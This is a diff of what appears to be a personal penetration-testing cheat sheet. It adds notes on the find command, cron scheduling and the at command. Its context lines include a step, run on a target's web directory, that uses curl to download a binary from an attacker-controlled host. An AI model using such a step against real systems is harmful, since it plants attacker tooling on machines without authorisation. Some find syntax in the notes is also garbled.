@@ -82,3 +82,33 @@ cp <path> <repertory> # where python server running
 cd /var/www/html # on target, binary to be wrote within
 curl -O http://<attacker-ip>:<python-server-port>/<binary>
 ```
+
+# Investigation
+```bash
+find <departus-point> -name <name> -o -name # -o or. Departus can be multiple root
+find / -name -regex "<match>"
+find / -type f
+```
+
+# Automation
+## Cron
+```bash
+crontab -e # open a crontab edit file to append script to automatize
+* * * * * /path/to/script.sh # execute the script every minutes
+* * * * * <command> >> /tmp/file.log # handle the output
+```
+nb of * depends when to execute :
+* `* * * * *` every minutes (`*/5 * * * *`for every five minutes)
+* `0 * * * * ` every hours
+* `0 0 * * * ` every days (of the month)
+* `0 0 1 * * ` every month
+* `0 0 * * 0 ` every day (of the week, 0 being sunday)
+Examples : every 11:30pm = 30 23 * * *
+
+## At
+```bash
+at <time-repetition> # example : now + 1 minute, 11pm, tomorrow...
+<command> # Ctrl + D to save
+atq # see running jobs
+atrm <id> # remove
+```
